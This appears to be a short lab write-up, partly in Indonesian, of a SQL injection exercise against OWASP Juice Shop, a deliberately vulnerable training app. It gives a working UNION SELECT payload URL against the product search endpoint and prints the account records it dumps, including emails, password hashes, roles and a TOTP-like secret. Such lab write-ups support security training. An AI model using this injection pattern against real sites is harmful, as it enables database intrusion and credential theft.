# Juice-Shop: User Credentials

## Step 1: Initial Payload

Pada tahap pertama dilakukan SQL Injection untuk mendapatkan data sensitif dari tabel **Users**.

```
{
  "status": "success",
  "data": [
    {
      "id": 1,
      "name": 2,
      "description": 3,
      "price": 4,
      "deluxePrice": 5,
      "image": 6,
      "createdAt": 7,
      "updatedAt": 8,
      "deletedAt": null
    }
  ]
}
```
Step 2: Extracted User Data
Hasil SQL Injection memperlihatkan data akun dari tabel Users, termasuk email, role, dan password hash.


```
{
  "id": "hello",
  "name": "admin@juice-sh.op",
  "description": "0192023a7bbd73250516f069df18b500",
  "price": "admin",
  "deluxePrice": "",
  "image": "",
  "createdAt": "",
  "updatedAt": "",
  "deletedAt": 1
},
{
  "id": "j0hNny",
  "name": "john@juice-sh.op",
  "description": "00479e957b6b42c459ee5746478e4d45",
  "price": "customer",
  "deluxePrice": "",
  "image": "",
  "createdAt": "assets/public/images/uploads/default.svg",
  "updatedAt": "",
  "deletedAt": 18
},
{
  "id": "wurstbrot",
  "name": "wurstbrot@juice-sh.op",
  "description": "9ad5b8492bbe528583e128d2a8941de4",
  "price": "admin",
  "deluxePrice": "",
  "image": "assets/public/images/uploads/defaultAdmin.png",
  "updatedAt": "IFtXES3SPOEYVURT2MYRG152TKJ4HC3KH",
  "deletedAt": 10
}
```
Step 3: SQL Injection Endpoint
Payload SQL Injection yang digunakan:


```
https://juice-shop.herokuapp.com/rest/products?q=')%20UNION%20SELECT%20username,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,id%20FROM%20Users--
```

Hasilnya menampilkan kredensial user seperti berikut:
```
{
  "id": "evmrox",
  "name": "ethereum@juice-sh.op",
  "description": "2c17c6937771ee3048ae34ddb380c5ec",
  "price":
}
```